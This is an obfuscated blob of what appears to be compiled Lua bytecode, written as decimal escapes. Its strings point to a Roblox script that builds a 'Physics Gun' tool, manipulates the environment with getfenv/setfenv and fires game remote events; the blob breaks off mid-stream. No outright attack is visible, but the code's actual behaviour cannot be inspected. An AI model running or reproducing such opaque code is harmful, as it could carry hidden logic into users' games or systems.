1\3\39\0\65\67\39\0\92\128\128\6\9\64\0\154\5\192\6\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\192\6\0\69\192\10\0\70\0\193\0\129\192\36\0\193\0\37\0\1\1\34\0\92\128\0\2\9\64\0\164\5\192\6\0\69\192\10\0\70\0\193\0\129\128\39\0\193\192\39\0\1\1\40\0\92\128\0\2\9\64\128\164\5\192\6\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\0\7\0\9\64\224\142\5\0\7\0\69\192\6\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\0\7\0\36\1\2\0\4\0\0\0\156\0\128\1\28\64\0\0\5\64\40\0\69\128\0\0\75\128\232\0\92\0\0\1\28\0\1\0\22\192\2\128\69\129\1\0\75\193\193\2\193\193\40\0\92\129\128\1\70\1\233\2\70\65\233\2\9\65\129\143\69\129\41\0\164\65\2\0\0\0\0\2\92\65\0\1\227\0\0\0\33\128\0\0\22\64\252\127\5\128\0\0\11\192\105\0\28\64\0\1\5\64\40\0\69\64\0\0\28\0\1\1\22\0\1\128\69\1\42\0\164\129\2\0\0\0\0\2\92\65\0\1\227\0\0\0\33\128\0\0\22\0\254\127\30\0\128\0\169\0\0\0\4\8\0\0\0\115\97\110\100\98\111\120\0\4\5\0\0\0\99\111\114\115\0\4\4\0\0\0\109\97\115\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\6\0\0\0\77\111\100\101\108\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\9\0\0\0\76\105\103\104\116\105\110\103\0\4\6\0\0\0\84\111\111\108\48\0\4\5\0\0\0\84\111\111\108\0\4\6\0\0\0\80\97\114\116\49\0\4\5\0\0\0\80\97\114\116\0\4\14\0\0\0\67\121\108\105\110\100\101\114\77\101\115\104\50\0\4\13\0\0\0\67\121\108\105\110\100\101\114\77\101\115\104\0\4\6\0\0\0\80\97\114\116\51\0\4\13\0\0\0\76\111\99\97\108\83\99\114\105\112\116\52\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\8\0\0\0\83\99\114\105\112\116\53\0\4\7\0\0\0\83\99\114\105\112\116\0\4\13\0\0\0\76\111\99\97\108\83\99\114\105\112\116\54\0\4\8\0\0\0\83\99\114\105\112\116\55\0\4\13\0\0\0\76\111\99\97\108\83\99\114\105\112\116\56\0\4\6\0\0\0\80\97\114\116\57\0\4\9\0\0\0\83\99\114\105\112\116\49\48\0\4\7\0\0\0\80\97\114\116\49\49\0\4\9\0\0\0\83\99\114\105\112\116\49\50\0\4\7\0\0\0\80\97\114\116\49\51\0\4\9\0\0\0\83\99\114\105\112\116\49\52\0\4\5\0\0\0\78\97\109\101\0\4\12\0\0\0\80\104\121\115\105\99\115\32\71\117\110\0\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\67\97\110\66\101\68\114\111\112\112\101\100\0\1\0\4\7\0\0\0\72\97\110\100\108\101\0\4\9\0\0\0\77\97\116\101\114\105\97\108\0\4\5\0\0\0\69\110\117\109\0\4\5\0\0\0\78\101\111\110\0\4\11\0\0\0\66\114\105\99\107\67\111\108\111\114\0\4\5\0\0\0\67\121\97\110\0\4\13\0\0\0\84\114\97\110\115\112\97\114\101\110\99\121\0\3\0\0\0\0\0\0\240\63\4\9\0\0\0\82\111\116\97\116\105\111\110\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\0\0\0\0\0\3\42\162\203\64\10\215\46\64\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\4\11\0\0\0\70\111\114\109\70\97\99\116\111\114\0\4\7\0\0\0\67\117\115\116\111\109\0\4\5\0\0\0\83\105\122\101\0\3\100\52\65\192\153\153\217\63\3\33\188\21\64\51\51\211\63\4\7\0\0\0\67\70\114\97\109\101\0\3\41\32\237\127\128\162\75\192\3\63\197\27\224\28\74\230\63\3\11\198\243\223\164\133\216\63\3\64\42\205\255\14\217\238\63\3\150\43\228\63\12\29\10\191\3\174\232\27\64\219\4\209\63\3\42\205\195\255\109\42\9\63\3\48\193\148\254\67\226\235\62\3\174\232\27\64\219\4\209\191\3\115\255\69\0\64\125\108\190\4\14\0\0\0\66\111\116\116\111\109\83\117\114\102\97\99\101\0\4\12\0\0\0\83\117\114\102\97\99\101\84\121\112\101\0\4\7\0\0\0\83\109\111\111\116\104\0\4\11\0\0\0\84\111\112\83\117\114\102\97\99\101\0\4\6\0\0\0\67\111\108\111\114\0\4\7\0\0\0\67\111\108\111\114\51\0\3\116\33\251\197\17\16\144\63\3\46\255\33\253\246\245\229\63\3\33\205\88\52\157\157\237\63\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\12\0\0\0\79\114\105\101\110\116\97\116\105\111\110\0\4\6\0\0\0\83\99\97\108\101\0\3\148\28\229\157\153\153\185\63\4\6\0\0\0\83\104\111\111\116\0\4\12\0\0\0\82\101\102\108\101\99\116\97\110\99\101\0\3\19\0\0\64\51\51\211\63\3\31\110\226\63\184\190\86\64\3\51\169\128\255\214\163\208\63\3\106\223\220\95\61\218\86\192\3\17\222\10\160\153\153\201\63\3\0\0\0\0\0\0\208\63\3\167\187\204\95\10\215\211\63\3\34\184\219\63\96\102\75\192\3\40\186\236\223\14\199\232\63\3\157\139\31\96\54\60\232\191\3\21\35\209\31\40\36\153\191\3\31\89\43\160\113\253\239\63\3\4\149\29\32\124\217\114\63\3\78\188\163\128\29\81\145\63\3\78\1\10\32\190\141\116\63\3\214\200\189\223\185\254\239\191\3\239\120\233\223\91\252\239\191\3\242\82\62\0\193\14\153\191\3\163\204\44\96\7\112\145\191\3\245\230\38\32\92\63\86\64\3\211\217\201\224\40\156\100\64\3\43\197\233\127\20\94\82\64\4\6\0\0\0\116\97\98\108\101\0\4\7\0\0\0\105\110\115\101\114\116\0\4\16\0\0\0\113\80\101\114\102\101\99\116\105\111\110\87\101\108\100\0\4\8\0\0\0\65\110\105\109\97\116\101\0\4\12\0\0\0\76\105\110\101\67\111\110\110\101\99\116\0\4\9\0\0\0\68\105\115\97\98\108\101\100\0\1\1\4\11\0\0\0\77\97\105\110\83\99\114\105\112\116\0\4\9\0\0\0\71\108\111\119\80\97\114\116\0\3\0\0\0\0\0\0\224\63\3\180\80\215\127\194\101\86\192\4\6\0\0\0\83\104\97\112\101\0\4\9\0\0\0\80\97\114\116\84\121\112\101\0\4\9\0\0\0\67\121\108\105\110\100\101\114\0\3\129\44\159\64\51\51\243\63\3\223\67\234\191\204\204\228\63\3\0\0\0\0\0\0\0\64\3\150\182\19\128\218\104\75\192\3\108\110\254\191\231\192\232\63\3\138\173\85\0\105\198\170\191\3\162\154\10\224\138\37\126\63\3\44\120\158\255\255\191\201\61\3\63\110\252\223\202\255\239\191\3\124\111\18\0\0\0\202\61\3\128\246\150\255\201\117\227\61\3\63\110\252\223\202\255\239\63\3\207\176\1\0\0\0\204\61\3\117\238\86\0\139\37\126\63\3\169\55\254\159\30\101\86\192\4\12\0\0\0\71\108\111\119\32\83\99\114\105\112\116\0\3\95\4\50\224\81\88\86\192\3\233\205\77\64\184\222\75\192\3\0\0\0\0\0\80\86\192\3\170\50\203\31\133\235\209\63\3\136\227\175\127\141\125\75\192\3\152\131\226\191\39\243\239\63\3\4\93\190\159\97\148\233\63\3\103\84\32\128\194\3\226\63\3\42\50\228\31\80\114\234\191\3\175\164\23\224\123\114\234\63\3\105\203\243\191\224\3\226\63\3\121\63\209\255\196\248\112\191\3\16\217\183\127\91\234\120\63\3\255\193\209\159\71\33\65\192\3\118\54\228\159\153\201\87\64\3\106\29\11\192\245\232\74\192\3\169\55\254\159\30\133\88\64\3\250\104\204\127\163\75\75\192\3\217\193\238\95\76\79\239\63\3\119\233\9\0\211\63\181\191\3\238\250\240\31\23\180\226\191\3\173\21\33\0\46\212\233\191\3\234\45\56\160\57\180\152\63\3\40\15\239\95\119\223\233\63\3\78\210\29\64\150\208\226\191\3\186\105\18\64\90\225\239\63\3\207\24\218\255\143\122\177\191\3\95\193\92\96\77\36\171\191\3\255\193\209\159\71\1\66\64\3\244\168\248\191\163\112\87\192\3\122\0\73\224\40\92\251\63\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\6\0\0\0\112\99\97\108\108\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\6\0\0\0\115\112\97\119\110\0\11\0\0\0\0\0\0\0\113\9\0\0\126\9\0\0\0\2\0\7\17\0\0\0\133\0\0\0\192\0\128\0\156\128\0\1\197\64\0\0\10\1\0\0\74\65\0\0\164\1\0\0\0\0\0\0\0\0\0\1\73\129\1\129\220\128\128\1\5\193\0\0\64\1\128\0\128\1\128\1\28\65\128\1\94\0\0\1\30\0\128\0\4\0\0\0\4\8\0\0\0\103\101\116\102\101\110\118\0\4\13\0\0\0\115\101\116\109\101\116\97\116\97\98\108\101\0\4\8\0\0\0\95\95\105\110\100\101\120\0\4\8\0\0\0\115\101\116\102\101\110\118\0\1\0\0\0\0\0\0\0\116\9\0\0\122\9\0\0\2\2\0\3\9\0\0\0\23\0\192\0\22\128\0\128\132\0\0\0\158\0\0\1\22\128\0\128\132\0\128\0\134\64\0\1\158\0\0\1\30\0\128\0\1\0\0\0\4\7\0\0\0\115\99\114\105\112\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\184\9\0\0\118\10\0\0\1\0\0\23\75\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\69\0\0\0\75\64\192\0\193\0\1\0\92\128\128\1\133\0\0\0\139\64\64\1\1\65\1\0\156\128\128\1\197\0\0\0\198\128\193\1\198\192\193\1\11\1\194\1\28\129\0\1\68\1\0\0\70\65\194\2\133\129\2\0\203\193\194\2\65\2\3\0\220\1\128\1\156\129\0\0\195\1\128\5\2\3\128\0\100\3\0\0\164\67\0\0\0\0\0\6\0\0\128\1\0\0\0\4\0\0\128\4\0\0\128\6\228\131\0\0\0\0\0\7\0\0\0\2\36\196\0\0\0\0\0\3\0\0\128\1\0\0\0\7\67\4\128\8\164\4\1\0\0\0\128\1\0\0\0\4\0\0\0\5\0\0\128\4\0\0\128\5\0\0\128\8\0\0\0\2\0\0\0\1\0\0\128\3\0\0\0\8\0\0\0\0\0\0\128\7\0\0\0\6\0\0\128\0\228\68\1\0\0\0\128\3\0\0\128\0\0\0\0\2\0\0\128\8\0\0\0\4\0\0\0\5\0\0\128\4\0\0\128\5\6\69\195\2\11\133\67\10\128\5\0\9\28\69\128\1\6\197\195\2\11\133\67\10\128\5\128\9\28\69\128\1\30\0\128\0\16\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\14\0\0\0\82\101\110\100\101\114\83\116\101\112\112\101\100\0\4\21\0\0\0\67\111\110\116\101\120\116\65\99\116\105\111\110\83\101\114\118\105\99\101\0\4\17\0\0\0\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\7\0\0\0\80\97\114\101\110\116\0\4\8\0\0\0\114\101\113\117\105\114\101\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\12\0\0\0\83\99\114\101\101\110\83\112\97\99\101\0\4\9\0\0\0\69\113\117\105\112\112\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\11\0\0\0\85\110\101\113\117\105\112\112\101\100\0\6\0\0\0\0\0\0\0\205\9\0\0\212\9\0\0\0\1\0\10\22\0\0\0\70\0\64\0\133\64\0\0\203\128\192\0\66\1\128\0\220\0\128\1\156\0\1\0\22\192\2\128\203\193\64\3\65\2\1\0\220\129\128\1\218\65\0\0\22\0\1\128\203\193\64\3\65\66\1\0\220\129\128\1\218\1\0\0\22\64\0\128\194\1\128\0\222\1\0\1\161\128\0\0\22\64\252\127\30\0\128\0\6\0\0\0\4\6\0\0\0\84\111\114\115\111\0\4\6\0\0\0\112\97\105\114\115\0\4\18\0\0\0\71\101\116\67\111\110\110\101\99\116\101\100\80\97\114\116\115\0\4\4\0\0\0\73\115\65\0\4\5\0\0\0\83\101\97\116\0\4\12\0\0\0\86\101\104\105\99\108\101\83\101\97\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\217\9\0\0\20\10\0\0\5\1\0\18\196\0\0\0\68\0\0\0\90\64\0\0\22\0\0\128\30\0\128\0\68\0\128\0\70\0\192\0\70\64\192\0\75\128\192\0\92\128\0\1\133\192\0\0\134\0\65\1\134\64\65\1\87\128\128\0\22\0\45\128\68\0\128\0\70\0\192\0\70\128\193\0\132\0\128\0\134\0\64\1\134\192\65\1\198\0\66\1\205\192\0\0\198\64\194\1\5\129\2\0\6\193\66\2\75\1\195\1\197\65\3\0\198\129\195\3\1\194\3\0\65\2\4\0\129\194\3\0\220\1\0\2\92\1\0\0\28\129\0\0\64\1\0\2\133\129\2\0\134\65\68\3\192\1\128\2\156\129\0\1\24\128\1\137\22\0\1\128\133\129\2\0\134\193\68\3\193\129\4\0\156\129\0\1\64\1\0\3\132\1\0\1\197\65\5\0\198\129\195\3\1\194\3\0\65\2\4\0\129\194\3\0\220\129\0\2\5\66\5\0\6\130\69\4\69\130\2\0\70\194\197\4\77\66\129\4\133\130\2\0\134\194\69\5\193\194\3\0\28\130\0\2\206\1\130\3\137\193\1\138\132\1\128\0\134\1\64\3\139\1\70\3\1\66\6\0\156\129\128\1\198\1\194\0\6\66\197\0\11\130\70\4\133\66\3\0\134\130\67\5\198\194\198\0\198\2\199\5\207\66\199\5\6\195\70\3\6\3\71\6\15\67\71\6\204\2\131\5\6\195\198\0\6\131\71\6\15\67\71\6\70\195\70\3\70\195\199\6\79\67\199\6\13\67\3\6\65\195\3\0\156\2\0\2\28\130\0\0\204\1\130\3\13\194\1\0\69\66\3\0\70\130\195\4\129\2\4\0\193\194\3\0\1\3\4\0\92\130\0\2\14\66\2\4\6\66\66\4\70\66\197\0\70\2\200\4\133\66\3\0\134\130\67\5\193\2\4\0\1\195\3\0\65\3\4\0\156\130\0\2\78\130\130\4\70\66\194\4\133\130\2\0\134\194\66\5\203\2\67\4\64\3\128\4\220\2\128\1\156\130\0\0\197\66\8\0\0\3\0\5\220\130\0\1\23\128\200\5\22\0\0\128\129\194\3\0\196\2\128\0\198\2\192\5\198\66\192\5\203\130\192\5\220\130\0\1\5\195\0\0\6\3\65\6\6\195\72\6\23\0\131\5\22\0\4\128\198\66\197\0\198\2\200\5\203\2\201\5\64\3\0\4\220\130\128\1\5\131\2\0\6\195\69\6\15\67\71\6\24\128\2\6\22\128\0\128\5\131\2\0\6\195\69\6\143\66\71\6\6\131\199\5\24\192\67\6\22\0\0\128\146\2\0\5\196\2\128\1\5\67\5\0\6\131\67\6\65\3\4\0\129\67\9\0\193\195\3\0\28\131\0\2\69\67\5\0\70\131\197\6\133\131\2\0\134\195\69\7\143\67\71\7\141\3\1\7\197\131\2\0\198\195\197\7\207\67\199\7\204\131\130\7\1\196\3\0\92\131\0\2\14\67\3\6\201\2\3\138\196\2\0\2\4\3\128\0\6\3\64\6\220\130\0\1\218\66\0\0\22\64\4\128\197\66\5\0\198\130\195\5\6\3\194\0\70\3\194\0\133\67\3\0\134\131\67\7\198\3\71\0\6\4\194\0\6\132\71\8\70\196\71\0\156\131\0\2\198\3\194\0\141\195\3\7\134\67\66\7\76\131\131\6\220\130\128\1\73\192\130\138\22\192\255\127\30\0\128\0\38\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\9\0\0\0\71\101\116\83\116\97\116\101\0\4\5\0\0\0\69\110\117\109\0\4\18\0\0\0\72\117\109\97\110\111\105\100\83\116\97\116\101\84\121\112\101\0\4\9\0\0\0\83\119\105\109\109\105\110\103\0\4\6\0\0\0\84\111\114\115\111\0\4\5\0\0\0\72\101\97\100\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\5\0\0\0\117\110\105\116\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\97\99\111\115\0\4\4\0\0\0\68\111\116\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\240\63\4\4\0\0\0\100\101\103\0\3\0\0\0\0\0\128\91\64\4\4\0\0\0\114\97\100\0\4\3\0\0\0\67\48\0\4\7\0\0\0\67\70\114\97\109\101\0\4\7\0\0\0\65\110\103\108\101\115\0\4\3\0\0\0\112\105\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\10\0\0\0\82\105\103\104\116\32\65\114\109\0\4\19\0\0\0\118\101\99\116\111\114\84\111\87\111\114\108\100\83\112\97\99\101\0\4\5\0\0\0\83\105\122\101\0\4\2\0\0\0\88\0\3\0\0\0\0\0\0\0\64\4\2\0\0\0\89\0\4\2\0\0\0\90\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\4\9\0\0\0\116\111\115\116\114\105\110\103\0\4\8\0\0\0\45\49\46\35\73\78\68\0\4\7\0\0\0\83\101\97\116\101\100\0\4\6\0\0\0\67\114\111\115\115\0\3\0\0\0\0\0\0\224\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\23\10\0\0\25\10\0\0\2\0\0\2\6\0\0\0\4\0\0\0\68\0\128\0\70\0\192\0\70\64\192\0\28\64\0\1\30\0\128\0\2\0\0\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\28\10\0\0\49\10\0\0\3\2\0\10\69\0\0\0\90\64\0\0\22\64\16\128\132\0\0\0\134\0\64\1\198\64\64\0\198\128\192\1\6\65\64\0\6\193\64\2\65\1\1\0\156\128\0\2\197\64\1\0\198\128\193\1\198\192\193\1\198\0\194\1\203\64\194\1\68\1\0\0\70\1\192\2\134\65\64\0\134\129\64\3\198\65\64\0\198\193\192\3\1\2\1\0\92\1\0\2\220\128\0\0\5\65\1\0\6\129\65\2\6\193\65\2\6\1\66\2\6\129\66\2\205\192\0\2\4\1\0\0\6\1\64\2\70\65\64\0\70\129\192\2\134\65\64\0\134\193\64\3\193\193\2\0\28\129\0\2\69\65\1\0\70\129\193\2\70\193\193\2\70\1\194\2\75\65\194\2\192\1\0\2\92\129\128\1\14\1\195\2\70\65\67\2\24\64\1\135\22\64\0\128\70\193\67\2\14\129\195\2\69\1\4\0\70\65\196\2\128\1\128\1\192\1\0\2\92\129\128\1\133\65\1\0\134\129\65\3\139\129\68\3\0\2\128\2\68\2\128\0\70\194\196\4\156\193\0\2\218\1\0\0\22\128\0\128\4\2\0\1\64\2\128\3\28\66\0\1\30\0\128\0\20\0\0\0\4\14\0\0\0\83\99\114\101\101\110\84\111\87\111\114\108\100\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\2\0\0\0\88\0\4\2\0\0\0\89\0\3\0\0\0\0\0\0\240\63\4\5\0\0\0\103\97\109\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\14\0\0\0\67\117\114\114\101\110\116\67\97\109\101\114\97\0\4\16\0\0\0\67\111\111\114\100\105\110\97\116\101\70\114\97\109\101\0\4\19\0\0\0\118\101\99\116\111\114\84\111\87\111\114\108\100\83\112\97\99\101\0\4\2\0\0\0\112\0\3\0\0\0\0\0\0\73\64\3\0\0\0\0\0\0\240\191\4\10\0\0\0\109\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\32\140\64\4\5\0\0\0\117\110\105\116\0\4\4\0\0\0\82\97\121\0\4\4\0\0\0\110\101\119\0\4\14\0\0\0\70\105\110\100\80\97\114\116\79\110\82\97\121\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\53\10\0\0\103\10\0\0\14\0\0\7\86\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\70\128\64\0\72\0\128\0\68\0\128\0\70\192\192\0\72\0\0\1\75\0\65\0\193\64\1\0\92\128\128\1\72\0\128\1\68\0\128\1\70\192\192\0\72\0\0\2\68\0\0\3\70\128\193\0\72\0\128\2\68\0\0\3\73\192\65\131\68\0\128\3\70\0\194\0\90\0\0\0\22\128\1\128\68\0\128\3\70\64\194\0\75\128\194\0\196\0\128\4\92\128\128\1\72\0\0\4\22\0\1\128\68\0\0\5\75\128\194\0\196\0\128\5\92\128\128\1\72\0\0\4\68\0\128\3\70\192\194\0\75\128\194\0\228\0\0\0\4\0\0\6\92\64\128\1\68\0\128\3\70\0\195\0\75\128\194\0\228\64\0\0\4\0\0\6\92\64\128\1\69\64\3\0\70\128\195\0\70\192\195\0\75\0\196\0\92\64\0\1\68\0\0\3\70\64\196\0\75\128\194\0\228\128\0\0\4\0\0\3\92\64\128\1\68\0\128\6\75\128\196\0\193\192\4\0\36\193\0\0\66\1\128\0\129\1\5\0\92\64\0\3\69\64\5\0\70\128\197\0\90\0\0\0\22\128\3\128\68\0\0\4\90\0\0\0\22\192\2\128\69\192\5\0\92\64\128\0\69\64\3\0\70\128\195\0\70\0\198\0\75\0\196\0\196\0\128\0\198\192\192\1\4\1\128\1\6\193\64\2\92\64\0\2\22\0\252\127\30\0\128\0\25\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\6\0\0\0\84\111\114\115\111\0\4\5\0\0\0\78\101\99\107\0\4\3\0\0\0\67\48\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\15\0\0\0\82\105\103\104\116\32\83\104\111\117\108\100\101\114\0\4\5\0\0\0\73\99\111\110\0\4\25\0\0\0\114\98\120\97\115\115\101\116\105\100\58\47\47\32\50\49\56\52\57\51\57\52\48\57\0\4\13\0\0\0\84\111\117\99\104\69\110\97\98\108\101\100\0\4\11\0\0\0\84\111\117\99\104\77\111\118\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\13\0\0\0\84\111\117\99\104\83\116\97\114\116\101\100\0\4\11\0\0\0\84\111\117\99\104\69\110\100\101\100\0\4\5\0\0\0\103\97\109\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\24\0\0\0\82\79\66\76\79\88\95\80\105\115\116\111\108\69\113\117\105\112\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\12\0\0\0\66\117\116\116\111\110\49\68\111\119\110\0\4\23\0\0\0\66\105\110\100\65\99\116\105\111\110\84\111\73\110\112\117\116\84\121\112\101\115\0\4\7\0\0\0\82\101\108\111\97\100\0\4\1\0\0\0\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\17\0\0\0\70\105\108\116\101\114\105\110\103\69\110\97\98\108\101\100\0\4\5\0\0\0\119\97\105\116\0\4\25\0\0\0\82\79\66\76\79\88\95\80\105\115\116\111\108\85\112\100\97\116\101\69\118\101\110\116\0\4\0\0\0\0\0\0\0\75\10\0\0\77\10\0\0\1\2\0\3\3\0\0\0\147\0\128\0\136\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\78\10\0\0\80\10\0\0\1\2\0\3\3\0\0\0\130\0\0\0\136\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\86\10\0\0\88\10\0\0\1\0\0\3\9\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\132\0\0\0\134\0\65\1\134\64\65\1\28\64\128\1\30\0\128\0\6\0\0\0\4\5\0\0\0\103\97\109\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\23\0\0\0\82\79\66\76\79\88\95\80\105\115\116\111\108\70\105\114\101\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\91\10\0\0\93\10\0\0\0\0\0\2\6\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\28\64\0\1\30\0\128\0\4\0\0\0\4\5\0\0\0\103\97\109\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\25\0\0\0\82\79\66\76\79\88\95\80\105\115\116\111\108\82\101\108\111\97\100\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\106\10\0\0\113\10\0\0\8\0\0\3\25\0\0\0\4\0\0\0\26\0\0\0\22\128\0\128\4\0\0\0\11\0\64\0\28\64\0\1\4\0\128\0\11\64\64\0\129\128\0\0\28\64\128\1\5\192\0\0\6\0\65\0\6\64\65\0\11\128\65\0\28\64\0\1\4\0\0\1\68\0\128\1\9\64\128\131\4\0\0\2\68\0\128\2\9\64\0\132\4\0\0\3\68\0\128\3\9\64\0\132\30\0\128\0\9\0\0\0\4\11\0\0\0\100\105\115\99\111\110\110\101\99\116\0\4\13\0\0\0\85\110\98\105\110\100\65\99\116\105\111\110\0\4\7\0\0\0\82\101\108\111\97\100\0\4\5\0\0\0\103\97\109\101\0\4\18\0\0\0\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\0\4\26\0\0\0\82\79\66\76\79\88\95\80\105\115\116\111\108\85\110\101\113\117\105\112\69\118\101\110\116\0\4\11\0\0\0\70\105\114\101\83\101\114\118\101\114\0\4\5\0\0\0\73\99\111\110\0\4\3\0\0\0\67\48\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\121\10\0\0\107\11\0\0\1\0\0\17\56\0\0\0\2\0\0\0\100\0\0\0\0\0\128\0\164\64\0\0\228\128\0\0\0\0\128\0\36\193\0\0\100\1\1\0\0\0\0\2\138\1\0\3\193\1\0\0\1\66\0\0\65\130\0\0\129\194\0\0\193\2\1\0\1\67\1\0\162\65\0\3\202\1\128\1\1\130\1\0\65\194\1\0\129\2\2\0\226\65\128\1\36\66\1\0\0\0\0\3\0\0\128\3\100\130\1\0\0\0\0\0\0\0\0\4\4\0\0\0\164\194\1\0\0\0\0\2\0\0\128\2\228\2\2\0\0\0\128\4\0\0\0\5\36\67\2\0\0\0\0\1\4\0\0\0\0\0\128\1\0\0\128\5\64\3\0\6\92\131\128\0\90\3\0\0\22\128\2\128\132\3\0\0\134\67\66\7\23\128\66\7\22\128\1\128\132\3\0\0\134\195\66\7\134\3\67\7\139\67\67\7\36\132\2\0\0\0\0\6\156\67\128\1\30\0\128\0\14\0\0\0\4\11\0\0\0\84\111\112\83\117\114\102\97\99\101\0\4\14\0\0\0\66\111\116\116\111\109\83\117\114\102\97\99\101\0\4\12\0\0\0\76\101\102\116\83\117\114\102\97\99\101\0\4\13\0\0\0\82\105\103\104\116\83\117\114\102\97\99\101\0\4\13\0\0\0\70\114\111\110\116\83\117\114\102\97\99\101\0\4\12\0\0\0\66\97\99\107\83\117\114\102\97\99\101\0\4\6\0\0\0\72\105\110\103\101\0\4\6\0\0\0\77\111\116\111\114\0\4\14\0\0\0\83\116\101\112\112\105\110\103\77\111\116\111\114\0\4\10\0\0\0\67\108\97\115\115\78\97\109\101\0\4\7\0\0\0\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\16\0\0\0\65\110\99\101\115\116\114\121\67\104\97\110\103\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\11\0\0\0\0\0\0\0\171\10\0\0\179\10\0\0\1\2\0\10\14\0\0\0\128\0\128\0\192\0\0\0\156\64\0\1\133\0\0\0\203\64\64\0\220\192\0\1\22\192\0\128\196\1\0\0\0\2\0\3\64\2\128\0\220\65\128\1\161\128\0\0\22\64\254\127\30\0\128\0\2\0\0\0\4\5\0\0\0\110\101\120\116\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\181\10\0\0\193\10\0\0\0\2\0\6\13\0\0\0\128\0\0\0\134\0\64\1\23\64\64\1\22\64\0\128\195\0\128\1\222\0\0\1\203\128\64\1\64\1\128\0\220\128\128\1\218\0\0\0\22\64\253\127\158\0\0\1\30\0\128\0\3\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\4\0\0\0\73\115\65\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\195\10\0\0\209\10\0\0\1\1\0\5\8\0\0\0\74\0\0\0\132\0\0\0\192\0\0\0\36\1\0\0\0\0\128\0\156\64\128\1\94\0\0\1\30\0\128\0\0\0\0\0\1\0\0\0\0\0\0\0\202\10\0\0\206\10\0\0\1\1\0\4\11\0\0\0\75\0\64\0\193\64\0\0\92\128\128\1\90\